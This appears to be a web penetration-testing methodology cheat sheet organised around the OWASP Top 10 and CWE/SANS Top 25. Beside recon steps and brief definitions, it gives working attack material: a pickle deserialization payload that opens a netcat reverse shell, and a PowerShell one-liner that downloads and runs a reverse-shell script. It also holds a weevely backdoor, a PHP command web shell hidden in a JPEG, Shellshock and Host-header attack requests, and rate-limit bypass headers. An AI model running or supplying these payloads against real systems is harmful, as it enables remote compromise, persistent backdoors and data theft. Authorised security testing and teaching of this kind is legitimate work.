# Methodology

## Summary
- [Recon](#recon)
  - [Recon searching for](#recon-searching-for)
  - [S3 Buckets](#s3-buckets)
- [OWASP 10](#owasp-10---2017)
  - [Injection](#1---injection)
  - [Broken Authentication](#2---broken-authentication)
  - [Sensitive Data Exposure](#3---sensitive-data-exposure)
  - [XML External Entities (XXE)](#4---xml-external-entities-xxe)
  - [Broken Access Control](#5---broken-access-control)
  - [Security Misconfiguration](#6---security-misconfiguration)
  - [Cross-Site Scripting (XSS)](#7---cross-site-scripting-xss)
  - [Insecure Deserialization](#8---insecure-deserialization)
  - [Using Components with Known Vulnerabilities](#9---using-components-with-known-vulnerabilities)
  - [Insufficient Logging & Monitoring](#10---insufficient-logging--monitoring)
- [CWE - SANS 25](#cwesans-top-25-most-dangerous-software-errors)
  - [1 Improper Restriction of Operations within the Bounds of a Memory Buffer](#1cwe-119improper-restriction-of-operations-within-the-bounds-of-a-memory-buffer)
  - [2 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](#2cwe-79improper-neutralization-of-input-during-web-page-generation-cross-site-scripting)
  - [3 Improper Input Validation](#3cwe-20improper-input-validation)
  - [4 Information Exposure](#4cwe-200information-exposure)
  - [5 Out-of-bounds Read](#5cwe-125out-of-bounds-read)
  - [6 Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](#6cwe-89improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection)
  - [7 Use After Free](#7cwe-416use-after-free)
  - [8 Integer Overflow or Wraparound](#8cwe-190integer-overflow-or-wraparound)
  - [9 Cross-Site Request Forgery (CSRF)](#9cwe-352cross-site-request-forgery-csrf)
  - [10 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](#10cwe-22improper-limitation-of-a-pathname-to-a-restricted-directory-path-traversa)
  - [11 Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](#11cwe-78improper-neutralization-of-special-elements-used-in-an-os-command-os-command-injection)
  - [12 Out-of-bounds Write](#12cwe-787out-of-bounds-write)
  - [13 Improper Authentication](#13cwe-287improper-authentication)
  - [14 NULL Pointer Dereference](#14cwe-476null-pointer-dereference)
  - [15 Incorrect Permission Assignment for Critical Resource](#15cwe-732incorrect-permission-assignment-for-critical-resource)
  - [16 Unrestricted Upload of File with Dangerous Type](#16cwe-434unrestricted-upload-of-file-with-dangerous-type)
  - [17 Improper Restriction of XML External Entity Reference](#17cwe-611improper-restriction-of-xml-external-entity-reference)
  - [18 Improper Control of Generation of Code ('Code Injection')](#18cwe-94improper-control-of-generation-of-code-code-injection)
  - [19 Use of Hard-coded Credentials](#19cwe-798use-of-hard-coded-credentials)
  - [20 Uncontrolled Resource Consumption](#20cwe-400uncontrolled-resource-consumption)
  - [21 Missing Release of Resource after Effective Lifetime](#21cwe-772missing-release-of-resource-after-effective-lifetime)
  - [22 Untrusted Search Path](#22cwe-426untrusted-search-path)
  - [23 Deserialization of Untrusted Data](#23cwe-502deserialization-of-untrusted-data)
  - [24 Improper Privilege Management](#24cwe-269improper-privilege-management)
  - [25 Improper Certificate Validation](#25cwe-295improper-certificate-validation)
- [ClickJacking](#clickjacking)
- [Type Juggling](#type-juggling)
- [ShellShock Attack](#shellshock-attack)
- [CRLF](#crlf)
- [Google Dorks](#google-dorks)
- [Host Header Attack](#host-header-atttack)
- [Subdomain Takeover](#subdomain-takeover)
- [API Keys](#api-keys)
- [GraphQL](#graphql)
- [WAF Bypass](#waf-bypass)
# Recon
1) Enumerate Domains.
2) Enumerate Subdomains: recon.sh + httpx or Knockpy -w subdomains $domain.com.
3) Enumerate Params: gau, waybackurls, paramspider and dirsearch.
4) Enumerate ports of each subdomain: nmap.
5) API KEYS - cat url.txt | grep "\.js" xargs -I@ sh -c 'python.exe SecretFinder.py -i @ -e -o cli' | tee apiKeys.txt
6) Maltego + FOCA.
7) [Google Dorks](#google-dorks).
8) Frameworks, Languages, PaaS and Servers.
9) Shodan to know cves exposure

## Recon searching for:

### Requests:
1) setRequestHeader
2) XMLHttpRequest
3) $.ajax 
4) $.get 
5) $.post 
6) $.getJSON 
7) fetch( 
8) axios({ 
9) Url = "http

### FIREBASE:
firebaseio.com/.json

### Cookies:
1) set_cookie(
2) base64

## S3 Buckets
* s3.amazonaws.com
* Read: aws s3 ls s3://domain --no-sign-request = Response: An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist
* Upload: aws s3 cp poc.html s3://domain --no-sign-request = load to s3://
* Bruteforce: cat subdomains.txt | xargs -I@ sh -c 'aws s3 ls s3://@ --no-sign-request' | grep -v 'An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist'

### API Tokens:
1) pk_live
2) sk_live
3) AIza

### JWT
The Json web tokens cannot be tested in automated ways, so it is more likely to meet some bugs.

### Open Redirect
> Use "Burp Seach"
```http
?redirection=
?redir=
?redireccion=
```
# OWASP 10 - 2017
##### TIP: Always test ALL params

## 1 - Injection

1) Manual: Always add ?url=' or email=test@example.com'&pass=123'.
2) Manual: In intruder add sqli.txt.
3) Manual: Test cookies, referrer and User-Agent.
4) Automation: Use "sqlmap" every params, for GET requests.
5) Automation: Use sqlmap -r request.txt, for POST and PUT requests.

## 2 - Broken Authentication

1) Username enumeration via different responses
2) Enumeration error: "Incorrect password".
3) Ultimited requests + Weak password 
4) Request limit bypass via headers:
* X-Originating-IP: 127.0.0.1
* X-Forwarded-For: 127.0.0.1
* X-Remote-IP: 127.0.0.1
* X-Remote-Addr: 127.0.0.1
* X-Client-IP: 127.0.0.1
* X-Host: 127.0.0.1
* X-Forwared-Host: 127.0.0.1
5) Login successful reset request limit
6) Passwords in array: "password": []

## 3 - Sensitive Data Exposure

1) Change value of params: string to number, boolean, etc.
2) /cgi-bin/phpinfo.php
3) /robots.txt + Dirsearch fuzzing backups.
4) Google dorks: EJP: ext:bak ext:sql ext:txt, https://pentest-tools.com/.
5) TRACE method enabled, example: 400 status or /admin - exposing header X-Custom-IP-Authorization
6) /.git + site:github.com inurl:$domain.com

## 4 - XML External Entities (XXE)

Always test all params with:
https://github.com/AngelJuanMa/Web-Vulnerabilities/blob/main/Payloads/XXE.txt

## 5 - Broken Access Control

* Replace cookies or Authorization and remove credentials.  
* "roleid":1 to 2 or 0
* "admin": false to true
* X-Original-URL: /invalid = not found - X-Original-URL: /admin-panel
* Insecure direct object references - /?file=3.txt change to 2.txt

## 6 - Security Misconfiguration

* [S3 Buckets](#s3-buckets)
* Open source - Search in github for default credentials.
* Detailed errors, test with other inputs example: /?status=1 to /?status="one".

## 7 - Cross-Site Scripting (XSS)
> Search for
* "$(", example: $(window).on('hashchange', function(){ --> #" onload="this.src+='%3Cimg src=x onerror=print(1)%3E

## 8 - Insecure Deserialization
RCE via cookies desearilization with b64encode
```python
    import pickle
    import sys
    import base64
     
    command = 'rm /tmp/f; mkfifo /tmp/f | /bin/sh -i 2>&1 | netcat ip 4444 > /tmp/f'
     
    class rce(object):
    	def __reduce__(self):
    		import os
    		return (os.system,(command,))
     
    print(base64.b64encode(pickle.dumps(rce())))
```

## 9 - Using Components with Known Vulnerabilities
- Search: searchsploit hfs
- See code: searchsploit -x windows/remote/39161.py
- Install: searchsploit -m windows/remote/39161.py

1) Wpscan: wpscan --url https://
2) Shodan
3) Nmap
4) Burp suite
5) Nuclei -u domain
6) nikto -host domain
7) skipfish -o kit domain

## 10 - Insufficient Logging & Monitoring
> To know what to do and what is happening in the case of an attack.
* .log with = STATUS, IP, user, date and path.
* .log = 200 OK 49.99.13.16 user123 2019-03-21T21:07:35 /login

# CWE/SANS TOP 25 Most Dangerous Software Errors
## 1	CWE-119	Improper Restriction of Operations within the Bounds of a Memory Buffer

## 2	CWE-79	Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
1) Type 1: Reflected XSS (or Non-Persistent)
2) Type 2: Stored XSS (or Persistent) 
3) Type 0: DOM-Based XSS
## 3	CWE-20	Improper Input Validation
Input validation can be applied to:
1) raw data - strings, numbers, parameters, file contents, etc.
2) metadata - information about the raw data, such as headers or size 

May need to be validated upon entry into the code, such as: 
* specified quantities such as size, length, frequency, price, rate, number of operations, time, etc.
* implied or derived quantities, such as the actual size of a file instead of a specified size
* indexes, offsets, or positions into more complex data structures
* symbolic keys or other elements into hash tables, associative arrays, etc.
* well-formedness, i.e. syntactic correctness - compliance with expected syntax
* lexical token correctness - compliance with rules for what is treated as a token
* specified or derived type - the actual type of the input (or what the input appears to be)
* consistency - between individual data elements, between raw data and metadata, between references, etc.
* conformance to domain-specific rules, e.g. business logic
* equivalence - ensuring that equivalent inputs are treated the same
* authenticity, ownership, or other attestations about the input, e.g. a cryptographic signature to prove the source of the data 
## 4	CWE-200	Information Exposure
Some kinds of sensitive information include:

* private, personal information, such as personal messages, financial data, health records, geographic location, or contact details
* system status and environment, such as the operating system and installed packages
* business secrets and intellectual property
* network status and configuration
* the product's own code or internal state
* metadata, e.g. logging of connections or message headers
* indirect information, such as a discrepancy between two internal operations that can be observed by an outsider 

Information exposures can occur in different ways:

* The code explicitly inserts sensitive information into resources or messages that are intentionally made accessible to unauthorized actors, but should not   contain the information - i.e., the information should have been "scrubbed" or "sanitized"
* A different weakness or mistake indirectly inserts the sensitive information into resources, such as a web script error revealing the full system path of the program.
* The code manages resources that intentionally contain sensitive information, but the resources are unintentionally made accessible to unauthorized actors. In this case, the information exposure is resultant - i.e., a different weakness enabled the access to the information in the first place. 

[Reference](#3---sensitive-data-exposure)
## 5	CWE-125	Out-of-bounds Read
## 6	CWE-89	Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands. 

## 7	CWE-416	Use After Free
## 8	CWE-190	Integer Overflow or Wraparound
## 9	CWE-352	Cross-Site Request Forgery (CSRF)

/admin-roles?username=carlos&action=upgrade GET Request with unatorazided access + no csrf.

## 10	CWE-22	Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
## 11	CWE-78	Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
Listen
stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 192.168.1.xxx

Send - Windows
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.xxx 87
## 12	CWE-787	Out-of-bounds Write
## 13	CWE-287	Improper Authentication
## 14	CWE-476	NULL Pointer Dereference
## 15	CWE-732	Incorrect Permission Assignment for Critical Resource
## 16	CWE-434	Unrestricted Upload of File with Dangerous Type
## 17	CWE-611	Improper Restriction of XML External Entity Reference
## 18	CWE-94	Improper Control of Generation of Code ('Code Injection')
## 19	CWE-798	Use of Hard-coded Credentials
## 20	CWE-400	Uncontrolled Resource Consumption
## 21	CWE-772	Missing Release of Resource after Effective Lifetime
## 22	CWE-426	Untrusted Search Path
## 23	CWE-502	Deserialization of Untrusted Data
## 24	CWE-269	Improper Privilege Management
## 25	CWE-295	Improper Certificate Validation

## Clickjacking
> List forms to change password, email and delete account via GET Request + Submit input.
```html
<iframe src="$url?email=hacker@attacker-website.com"></iframe>
```

## Type Juggling
```http
POST https://example.com/login.php HTTP/1.1
Accept: */*
Content-Type: application/json

usuario=admin&password[]=anything
```
Add [] to password

## Shellshock Attack
```http
POST https://example.com/session.cgi HTTP/1.1
Accept: */*
User-Agent: () { :; }; echo "pwned"
```
## CRLF
Always test params with GET Requests: https://github.com/AngelJuanMa/Web-Vulnerabilities/blob/main/Payloads/CRLF.txt

## Google Dorks
```bash
python3.9 pagodo.py -d example.com -g ./dorks/all_google_dorks.txt
cat pagodo.py.log | grep 'Found unique URL #'
```
4.2 days to finish

## Host Header Atttack
```http
POST https://example.com/reset.php HTTP/1.1
Accept: */*
Content-Type: application/json
Host: SUBDOMAIN.burpcollaborator.net
```

## Subdomain Takeover
https://github.com/EdOverflow/can-i-take-over-xyz

## Api keys
https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/keyhacks-api.md

## Graphql
InQL extension of burp suite to list endpoints. 

## WAF bypass
```bash
sudo apt install jq
git clone https://github.com/vincentcox/bypass-firewalls-by-DNS-history
cd bypass-firewalls-by-DNS-history/
bash bypass-firewalls-by-DNS-history.sh --help
```
## Backdoor
```bash
weevely generate 12345 404.php
weevely http://domain.com/404.php 12345

jhead -purejpg ns.jpg
jhead -ce ns.jpg
mv ns.jpg ns.php.jpg

Insert:

<style>body{font-size: 0;}h1{font-size: 12px}</style><h1>
<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '<img src="foto.jpg" border=0>
';}__halt_compiler();?></h1>

:wq
```

```http
http://domain.com/ns.php.jpg?cmd=ls
```
